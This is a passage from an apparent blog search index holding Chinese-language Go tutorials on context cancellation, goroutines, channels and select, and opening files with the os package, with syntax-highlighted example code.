boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    background <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>emptyCtx<span class="token punctuation">)</span>    todo       <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>emptyCtx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Background returns a non-nil, empty Context. It is never canceled, has no</span><span class="token comment" spellcheck="true">// values, and has no deadline. It is typically used by the main function,</span><span class="token comment" spellcheck="true">// initialization, and tests, and as the top-level Context for incoming</span><span class="token comment" spellcheck="true">// requests.</span><span class="token keyword">func</span> <span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Context <span class="token punctuation">{</span>    <span class="token keyword">return</span> background<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// TODO returns a non-nil, empty Context. Code should use context.TODO when</span><span class="token comment" spellcheck="true">// it's unclear which Context to use or it is not yet available (because the</span><span class="token comment" spellcheck="true">// surrounding function has not yet been extended to accept a Context</span><span class="token comment" spellcheck="true">// parameter).</span><span class="token keyword">func</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Context <span class="token punctuation">{</span>    <span class="token keyword">return</span> todo<span class="token punctuation">}</span></code></pre><ul><li><p><strong>注意</strong></p><blockquote><p>单纯的根Context实际是没有用的，并不能取消子<code>goroutine</code>的执行，可以认为其只是做为Context树中的根节点而已。真正实现取消执行等功能的Context参考下一节。</p><p>根节点通常使用<code>Background()</code>，通常实在<code>main goroutine</code>中被创建。</p></blockquote></li></ul><h2 id="三、With系列函数"><a href="#三、With系列函数" class="headerlink" title="三、With系列函数"></a>三、With系列函数</h2><blockquote><p>Go除了提供根Context外，还提供了<code>WithCancel()</code>、<code>WithDeadline()</code>、<code>WithTimeout()</code>三个函数，这三个函数通过对父Context进行封装，可以实现带取消功能的Context。</p></blockquote><ul><li><p><code>func WithCancel(parent Context) (ctx Context, cancel CancelFunc)</code></p><ul><li><p>对父Context进行封装，返回子Context以及可以用来取消该子Context的<code>cancel</code>函数。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span>    ctx1 <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//根Context</span>    ctx2<span class="token punctuation">,</span> cancel <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithCancel</span><span class="token punctuation">(</span>ctx1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//封装根Context，返回带取消功能的子Context。</span>    <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">{</span>            <span class="token keyword">select</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ctx2<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//监听父goroutine是否让其取消执行。</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>ctx2<span class="token punctuation">.</span><span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//打印被取消执行的原因。context canceled</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>ctx2<span class="token punctuation">.</span><span class="token function">Deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//不适用于主动调用取消Context的情况。0001-01-01 00:00:00 +0000 UTC false</span>                ch <span class="token operator">&lt;-</span> <span class="token number">0</span>                <span class="token keyword">return</span>            <span class="token keyword">case</span> <span class="token operator">&lt;-</span>time<span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Still exec"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token function">cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//主动取消Context。让子goroutine取消执行</span>    <span class="token boolean">_</span> <span class="token operator">=</span> <span class="token operator">&lt;-</span>ch<span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)</code></p><ul><li><p>对父Context进行封装并传入一个计时器，返回一个子Context，该子Context除了可以用<code>cancel</code>函数来主动取消Context外，当计时器超时时，Context也会被取消。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span>    ctx1 <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    ctx2<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithTimeout</span><span class="token punctuation">(</span>ctx1<span class="token punctuation">,</span> time<span class="token punctuation">.</span>Second<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//2s过后，会取消Context。</span>    <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">{</span>            <span class="token keyword">select</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ctx2<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>ctx2<span class="token punctuation">.</span><span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//context deadline exceeded</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>ctx2<span class="token punctuation">.</span><span class="token function">Deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回Context被取消的时间。2020-10-20 16:58:38.7874815 +0800 CST m=+2.004461501 true</span>                ch <span class="token operator">&lt;-</span> <span class="token number">0</span>                <span class="token keyword">return</span>            <span class="token keyword">case</span> <span class="token operator">&lt;-</span>time<span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Millisecond <span class="token operator">*</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Still exec"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token boolean">_</span> <span class="token operator">=</span> <span class="token operator">&lt;-</span>ch<span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>func WithDeadline(parent Context, d time.Time) (Context, CancelFunc)</code></p><ul><li>对父Context进行封装并传入一个<code>deadline</code>时间，返回一个子Context，该子Context除了可以用<code>cancel</code>函数来主动取消Context外，当到<code>deadline</code>时间时，Context也会被取消。</li><li>相当于计划任务。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—并发</title>
      <link href="2020/10/16/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%B9%B6%E5%8F%91/"/>
      <url>2020/10/16/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%B9%B6%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Goroutine"><a href="#一、Goroutine" class="headerlink" title="一、Goroutine"></a>一、Goroutine</h2><blockquote><p><strong>并发与并行：</strong></p><ul><li>并发：在一个时间片段内的多个任务同时执行。（时间段内多个任务交替执行）</li><li>并行：在某一个时刻多个任务同时执行。</li></ul></blockquote><ul><li><p>Go语言的并发通过<code>goroutine</code>实现，<code>goroutine</code>是由Go语言的运行时（<code>runtime</code>）调度完成的。</p></li><li><p>Go 程序中使用 <code>go</code> 关键字为一个函数创建一个<code>goroutine</code>。一个函数可以被创建为多个 <code>goroutine</code>，一个 <code>goroutine</code> 必定对应一个函数(<code>roroutine</code>运行的最小单位是函数)。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> 函数名<span class="token punctuation">(</span> 参数列表 <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//使用 go 关键字创建 goroutine 时，被调用函数的返回值会被忽略。若需返回值，使用channel。</span></code></pre><ul><li><p>使用匿名函数创建<code>goroutine</code>：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span> 形参<span class="token number">1</span><span class="token punctuation">,</span>形参<span class="token number">2</span><span class="token operator">...</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        函数体   <span class="token punctuation">}</span><span class="token punctuation">(</span> 实参<span class="token number">1</span><span class="token punctuation">,</span>实参<span class="token number">2</span><span class="token operator">...</span> <span class="token punctuation">)</span> </code></pre></li></ul></li><li><p>Go 程序从 <code>main</code> 包的 <code>main()</code> 函数开始，在程序启动时，Go 程序就会为 <code>main()</code> 函数创建一个默认的 <code>goroutine</code>。</p><ul><li>所有在<code>main</code>中创建的<code>goroutine</code>， 在<code>main()</code>函数结束时会一同结束。</li></ul></li></ul><h2 id="二、并发通信"><a href="#二、并发通信" class="headerlink" title="二、并发通信"></a>二、并发通信</h2><ul><li>单纯的并发执行函数是没有意义的，并发目的应该是多个“人”去共同承担完成某件事，该某件事需要共享，即共享内存。</li><li><strong>两种常见的并发模型：</strong><ul><li>共享数据：多个并发单元对同一数据进行访问和修改，需要对数据加锁（同步）保证安全，避免死锁。</li><li>消息机制：每个并发单元是自包含的、独立的个体，并且都有自己的变量，不同并发单元间这些变量不共享，类似于线程。通过消息实现数据共享。这正是Go语言使用的共享内存的方式。</li></ul></li></ul><h5 id="0x00-通道（Channel）"><a href="#0x00-通道（Channel）" class="headerlink" title="0x00 通道（Channel）"></a>0x00 通道（Channel）</h5><ul><li><p>Go语言使用<code>channel</code>来实现<code>goroutine</code>之间的通信，可以把<code>channel</code>看作一个管道，遵循先进先出规则。</p></li><li><p><strong>声明</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> chanName <span class="token keyword">chan</span> dataType</code></pre><ul><li><code>chanName</code>即通道的变量名称。</li><li><code>chan dataType</code>通道的类型，<code>dataType</code>即该<code>channel</code>可以传输的数据类型。例如，<code>chan int</code> 表示该通道可以传输<code>int</code>类型的数据。</li></ul></li><li><p><strong>初始化</strong></p><blockquote><p>通道是引用类型，因此必要用使用make()函数进行内存分配才能使用。</p></blockquote><pre class=" language-go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span></code></pre><ul><li>向未初始化的通道传入值或获取值都会被阻塞，造成死锁。</li></ul></li><li><p><strong>读/写/关闭通道</strong></p><blockquote><ul><li><p>向通道写入数据： <code>chanName &lt;- data</code> </p></li><li><p>从通道读取数据： <code>varName :=&lt;- chanName</code> </p></li><li><p>关闭通道：<code>close(chanName)</code></p></li></ul></blockquote></li><li><p><strong>缓冲通道与无缓冲通道</strong></p><pre class=" language-go"><code class="language-go">通道实例 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> 通道类型<span class="token punctuation">,</span> <span class="token punctuation">[</span>缓冲大小<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//缓冲大小是可选项，忽略则为0（注意不是1），即无缓冲通道。</span></code></pre><ul><li>对于有缓冲的通道：<ul><li>向缓存满了的通道写入数据及会被阻塞。</li><li>从没有数据的通道读取数据也会被阻塞。</li></ul></li><li>对于无缓冲的通道（缓冲大小为0）：<ul><li>向通道写入数据会阻塞直到数据被读取。</li><li>从通道读取数据会阻塞直到读取到数据。</li></ul></li></ul></li><li><p><strong>单向通道：限制只能读或只能写。</strong></p><ul><li><code>chan&lt;- dataType</code>是一个只写单向通道（只能对其写入<code>dataType</code>类型的值）</li><li><code>&lt;-chan dataType</code>是一个只读单向通道（只能从其读取<code>dataType</code>类型的值）</li></ul></li><li><p><strong>遍历通道</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//通道可以使用for进行遍历，遍历只有一个返回结果，即通道的数据</span><span class="token keyword">for</span> data <span class="token operator">:=</span> <span class="token keyword">range</span> ch <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>通道是引用类型</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span>ch <span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"goroutine x exec"</span><span class="token punctuation">)</span>        ch <span class="token operator">&lt;-</span> <span class="token string">"done"</span>    <span class="token punctuation">}</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//传入通道到子goroutine中，由于是引用类型，因此传入的不是拷贝。</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Waiting for children goroutine"</span><span class="token punctuation">)</span>    <span class="token boolean">_</span> <span class="token operator">=</span> <span class="token operator">&lt;-</span>ch  <span class="token comment" spellcheck="true">//读取数据并丢弃，用于等待子goroutine运行完成。</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>通道传递的数据是值类型，那么传递的数据就是赋值。通道传递的数据是引用类型，那么传递的数据就是引用。</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 通道传值类型</span>    ch1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    a1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span>    ch1 <span class="token operator">&lt;-</span> a1    a2 <span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch1    a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">333</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2]</span>    <span class="token comment" spellcheck="true">// 通道传引用类型</span>    ch2 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    s1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>    ch2 <span class="token operator">&lt;-</span> s1    s2 <span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch2    s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">333</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[333 2 3]</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="三、多路复用（select）"><a href="#三、多路复用（select）" class="headerlink" title="三、多路复用（select）"></a>三、多路复用（select）</h2><blockquote><p>从没有数据的通道中读取数据会发生阻塞。向缓冲满了的通道写入数据也会被阻塞。</p><p>当我们向多个通道读/写数据时，可能会因为某个通道阻塞而导致对其它通道的操作都要等待，从而程序性能受损，因此产生了多路复用。</p></blockquote><ul><li><p><strong><code>select</code>语法格式与<code>switch</code>语句类似，但<code>select</code>有如下特点：</strong></p><ul><li><p><code>select</code>会<strong>随机</strong>执行一个可以执行的<code>case</code>。如果<code>case</code>发生阻塞，那么就是不能执行，就会寻找其它可执行的<code>case</code>。</p></li><li><p><code>case</code>语句之后的条件必须是I/O操作，例如向通道读/写数据。</p></li><li><p>如果所有<code>case</code>都不满足，则执行<code>default</code>。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//select随机写入0或1到ch通道中。</span>      <span class="token keyword">select</span> <span class="token punctuation">{</span>      <span class="token keyword">case</span> ch <span class="token operator">&lt;-</span> <span class="token number">0</span><span class="token punctuation">:</span>          fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Send Value:"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">case</span> ch <span class="token operator">&lt;-</span> <span class="token number">1</span><span class="token punctuation">:</span>          fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Send Value:"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      i <span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch      fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Value received:"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—文件</title>
      <link href="2020/10/16/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%96%87%E4%BB%B6/"/>
      <url>2020/10/16/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、打开-创建文件"><a href="#一、打开-创建文件" class="headerlink" title="一、打开/创建文件"></a>一、打开/创建文件</h2><ul><li><p><strong>创建文件：<code>os.Create()</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Create方法用于创建文件（create）或清空文件内容(truncated). </span><span class="token comment" spellcheck="true">// 如果文件已存在，则是清空文件内容。如果文件不存在，则新建文件，新建的文件权限（perm）默认会被设置为0666。</span><span class="token comment" spellcheck="true">// 如果Create方法成功调用，则会返回一个文件句柄（*File）,返回的文件句柄的操作模式（flag）为O_RDWR，即可读可写。</span><span class="token keyword">func</span> <span class="token function">Create</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>File<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">OpenFile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> O_RDWR<span class="token operator">|</span>O_CREATE<span class="token operator">|</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>打开文件：<code>os.Open()</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 传入文件名，返回一个文件句柄，返回的句柄操作模式为O_RDONLY，即只读。</span><span class="token keyword">func</span> <span class="token function">Open</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>File<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">OpenFile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><code>os.OpenFile()</code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 该方法是上面两个方法最终实际调用的方法，该函数是平台无关的。</span><span class="token comment" spellcheck="true">// 方法体中的openFileNolog()才是在不同平台中有不同的实现，但我们不用去关注，因为OpenFile会自动调用到不同平台实现的openFileNolog()方法。</span><span class="token comment" spellcheck="true">// flag是对函数返回的文件句柄的约束（例如，可读可写。。。）。</span><span class="token comment" spellcheck="true">// perm是文件在操作系统文件系统中的权限，遵循Linux的权限设置设计（如0755）。</span><span class="token keyword">func</span> <span class="token function">OpenFile</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> flag <span class="token builtin">int</span><span class="token punctuation">,</span> perm FileMode<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>File<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    testlog<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">openFileNolog</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> perm<span class="token punctuation">)</span>      <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err    <span class="token punctuation">}</span>    f<span class="token punctuation">.</span>appendMode <span class="token operator">=</span> flag<span class="token operator">&amp;</span>O_APPEND <span class="token operator">!=</span> <span class="token number">0</span>    <span class="token keyword">return</span> f<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre><ul><li><p><strong>flag：<code>flag</code>理解为Go程序层面的权限，即Go程序对文件句柄的操作权限。</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Flags to OpenFile wrapping those of the underlying system. Not all</span><span class="token comment" spellcheck="true">// flags may be implemented on a given system.</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    <span class="token comment" spellcheck="true">// 打开的文件句柄必须设置为三者中的其中一个.</span>    O_RDONLY <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_RDONLY <span class="token comment" spellcheck="true">// 以该标志打开的文件句柄只读。</span>    O_WRONLY <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_WRONLY <span class="token comment" spellcheck="true">// 以该标志打开的文件句柄只能写入内容。</span>    O_RDWR   <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_RDWR   <span class="token comment" spellcheck="true">// 以该标志打开的文件句柄可读可写。</span>    <span class="token comment" spellcheck="true">// 以下的用于搭配前三个使用.</span>    O_APPEND <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_APPEND <span class="token comment" spellcheck="true">// 配合写权限，表示写入的内容是追加。（反例为O_TRUNC）</span>    O_CREATE <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_CREAT  <span class="token comment" spellcheck="true">// 如果打开的文件不存在，则新建文件.</span>    O_EXCL   <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_EXCL   <span class="token comment" spellcheck="true">// used with O_CREATE, file must not exist.</span>    O_SYNC   <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_SYNC   <span class="token comment" spellcheck="true">// open for synchronous I/O.</span>    O_TRUNC  <span class="token builtin">int</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span>O_TRUNC  <span class="token comment" spellcheck="true">// 配合写权限，表示写入数据前会先清空文件内容。（反例为O_APPEND）</span><span class="token punctuation">)</span></code></pre></li><li><p><strong>perm：<code>perm</code>是文件系统层面的权限。</strong></p><ul><li>例：<code>0755</code><ul><li>第一位是特殊权限位，0表示无特殊权限。</li><li><code>755</code>即<code>rwxr-xr-x</code>。</li></ul></li></ul></li></ul></li></ul><h2 id="二、文件基本操作"><a href="#二、文件基本操作" class="headerlink" title="二、文件基本操作"></a>二、文件基本操作</h2><p>Go使用<code>os.File</code>结构体表示文件操作符，<code>os.Open()</code>、<code>os.Create()</code>、<code>os.OpenFile()</code>返回的都是<code>File</code>结构体，结构体中封装了打开的文件的文件句柄。</p><p>事实上<code>os.File</code>是对<code>os.file</code>的封装，<code>os.file</code>才是真正用来表示文件句柄的结构体，但该结构体不同平台中也是不一样的，而<code>os.File</code>为用户屏蔽了不同平台的实现细节，是平台无关的。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// File represents an open file descriptor.</span><span class="token keyword">type</span> File <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token operator">*</span>file <span class="token comment" spellcheck="true">// os specific</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Windows</span><span class="token comment" spellcheck="true">// file is the real representation of *File.</span><span class="token comment" spellcheck="true">// The extra level of indirection ensures that no clients of os</span><span class="token comment" spellcheck="true">// can overwrite this data, which could cause the finalizer</span><span class="token comment" spellcheck="true">// to close the wrong file descriptor.</span><span class="token keyword">type</span> file <span class="token keyword">struct</span> <span class="token punctuation">{</span>    pfd        poll<span class="token punctuation">.</span>FD    name       <span class="token builtin">string</span>    dirinfo    <span class="token operator">*</span>dirInfo <span class="token comment" spellcheck="true">// nil unless directory being read</span>    appendMode <span class="token builtin">bool</span>     <span class="token comment" spellcheck="true">// whether file is opened for appending</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Unix</span><span class="token comment" spellcheck="true">// file is the real representation of *File.</span><span class="token comment" spellcheck="true">// The extra level of indirection ensures that no clients of os</span><span class="token comment" spellcheck="true">// can overwrite this data, which could cause the finalizer</span><span class="token comment" spellcheck="true">// to close the wrong file descriptor.</span><span class="token keyword">type</span> file <span class="token keyword">struct</span> <span class="token punctuation">{</span>    pfd         poll<span class="token punctuation">.</span>FD    name        <span class="token builtin">string</span>    dirinfo     <span class="token operator">*</span>dirInfo <span class="token comment" spellcheck="true">// nil unless directory being read</span>    nonblock    <span class="token builtin">bool</span>     <span class="token comment" spellcheck="true">// whether we set nonblocking mode</span>    stdoutOrErr <span class="token builtin">bool</span>     <span class="token comment" spellcheck="true">// whether this is stdout or stderr</span>    appendMode  <span class="token builtin">bool</span>     <span class="token comment" spellcheck="true">// whether file is opened for appending</span><span class="token punctuation">}</span></code></pre><h5 id="0x00-文件基本信息"><a href="#0x00-文件基本信息" class="headerlink" title="0x00 文件基本信息"></a>0x00 文件基本信息</h5><ul><li><p><code>func (file *File) Stat() (FileInfo, error)</code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A FileInfo describes a file and is returned by Stat and Lstat.</span><span class="token keyword">type</span> FileInfo <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Name</span><span class="token punctuation">(</span><span class="token 